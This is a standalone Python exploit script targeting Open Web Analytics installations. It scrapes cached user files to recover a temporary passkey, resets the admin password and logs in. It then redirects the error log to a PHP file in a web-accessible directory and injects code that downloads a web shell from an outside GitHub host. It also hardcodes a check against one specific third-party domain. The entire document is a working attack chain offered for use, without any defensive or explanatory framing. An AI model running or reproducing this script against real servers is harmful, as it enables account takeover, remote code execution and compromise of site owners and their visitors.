import string
import hashlib
import requests
import os
import base64
import json
import re
import sys

os.chdir('/sdcard')

for key in range(100):
  
  base_url=sys.argv[1]
  user_id = 'user_id' + str(key)
  userid_hash = hashlib.md5(user_id.encode()).hexdigest() 
  filename = userid_hash + '.php'
  filename = userid_hash + '.php'
  cache_url = base_url + "owa-data/caches/" + str(key) + "/owa_user/" + filename
  cache = requests.get(cache_url)
  v = str(cache.status_code)
  if v == '200':
  	vx = str(cache.text)
  	sd = vx.replace('*' , '  *')
  	yum = sd.replace('*' ,'')
  	varane = yum.split()
  	hash = varane[1]
  	decode =base64.b64decode(hash).decode("ascii")
  	user = r'"user_id";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:5:"(\w*)"'
  	re1 = re.search(user, decode).group(1)
  	
  	
  	password =  r'"temp_passkey";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:32:"(\w*)"'
  	re2 = re.search(password, decode).group(1)
  	print('Votre mot de pass temporaire est : ' +re2)
  	
  	#hash
  	
  	
  	login = base_url + "index.php?owa_do=base.loginForm"
  	
  	password= base_url + "index.php?owa_do=base.usersPasswordEntry"
  	
  	config= base_url + "index.php?owa_do=base.optionsGeneral"
  	new_pass='jo'
  	
  	data1 = {
      "owa_password": new_pass,
      "owa_password2": new_pass,
      "owa_k": re2,
      "owa_action": 
      "base.usersChangePassword"
   }
  	


  	req1 = requests.post(password, data=data1)
  	print(req1.url)
  	session= requests.Session()
  	data2 = {
      "owa_user_id": 'admin',
      "owa_password": new_pass,
      "owa_action": "base.login"
   }
  	
  	req2 = session.post(login, data=data2)
  	
  	
  	cookie = session.cookies.get_dict()
  	
  	
  	shell = 'jo.php'
  	log_location = "/var/www/html/owa/owa-data/caches/" + shell
  	
  	
  	
  	data3 = {
      "owa_nonce": 'd019500240', 
      "owa_action": "base.optionsUpdate", 
      "owa_config[base.error_log_file]": log_location, 
      "owa_config[base.error_log_level]": 2
   }
  	
  	sam = requests.post(config, data=data3, cookies=cookie)
  	
  	
  	
  	reverse = f'<?php file_put_contents("{shell}", file_get_contents("https://raw.githubusercontent.com/Chocapikk/Shells/main/pwny.php")); ?>'
  	
  	
  	
  	
  	data4 = {
      "owa_nonce": 'd019500240',
      "owa_action": "base.optionsUpdate", 
      "owa_config[shell]": reverse
   }
  	
  	
  	sad = requests.post(config, data=data4, cookies=cookie)
  	cd = str(sad.url)
  	if cd == 'https://owa.communovation.com/index.php?owa_do=base.optionsGeneral&owa_site_id=&owa_status_code=2500&' :
  		base_url= 'https://owa.communovation.com/'
  		
  		print('\033[92m'+base_url+"/owa-data/caches/" + shell + ' '+ 'Succes [+]')
  	
  	
  		
  	
  	
   
   
   
   
   
     
   
   
   
   
   
  
  	
  	
  	